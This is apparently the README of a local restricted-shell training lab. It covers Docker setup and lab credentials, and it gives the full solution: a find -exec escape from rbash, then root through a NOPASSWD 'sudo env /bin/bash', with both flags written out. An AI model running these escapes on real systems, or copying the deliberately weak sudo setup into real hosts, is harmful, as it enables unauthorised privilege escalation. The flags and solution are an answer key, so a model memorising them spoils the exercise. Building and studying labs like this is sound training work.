# Vulnsec Academy — Shell Lab 01: Narrow Path

Restricted-shell lab. Enumerate rbash, escape with find (not awk), then sudo env.

## Start

```bash
chmod +x scripts/*.sh
./scripts/start.sh
```

- Atlas: `http://127.0.0.1:8888`
- Target: `10.23.54.81`
- SSH: `l.nash` / `Nash-Berth-81`

Stop any other Vulnsec lab first. Linux Docker Engine — [Linux Docker setup](#linux-docker-setup).

This is not Night Wharf. The allow-list has `find`, not `awk`.

## Student scope

You are authorised against a single Northline jump host.

- Target: `10.23.54.81`
- Atlas: `http://127.0.0.1:8888`
- SSH: `l.nash` / `Nash-Berth-81`
- Deliverable: user flag and root flag

Name the shell (`echo $0`). List `~/bin`. Look the names up on GTFOBins. Do not paste an awk one-liner from another lab.

Stay on the assigned host.

## Environment architecture

- Target: static `10.23.54.81`
- SSH 22 + HTTP 80 notice
- l.nash login shell `/bin/rbash`, PATH=/home/l.nash/bin
- Allow-list: ls cat echo pwd date find whoami (no awk)
- User flag: `SHELL{narrow_user_nash}`
- Escape: `find . -exec /bin/bash \; -quit`
- After escape: export PATH, `sudo -l` → NOPASSWD `/usr/bin/env`
- Root: `sudo env /bin/bash` then `/root/root.txt` = `SHELL{narrow_root_env}`
- Compose: no-new-privileges:false so sudo works

## Linux Docker setup

This package supports Kali Linux or another Linux host with Docker Engine and Docker Compose v2. Run one Vulnsec package at a time.

Install Docker Engine and the Compose v2 plugin using your Linux distribution’s official packages. Ensure the Docker service is running and your user can access it.

Verify the installation:

```bash
docker info
docker compose version
```

From this package directory:

```bash
chmod +x scripts/*.sh
./scripts/start.sh
./scripts/status.sh
```

When finished:

```bash
./scripts/stop.sh
```

Keep the environment local and do not expose intentionally vulnerable services to untrusted networks.
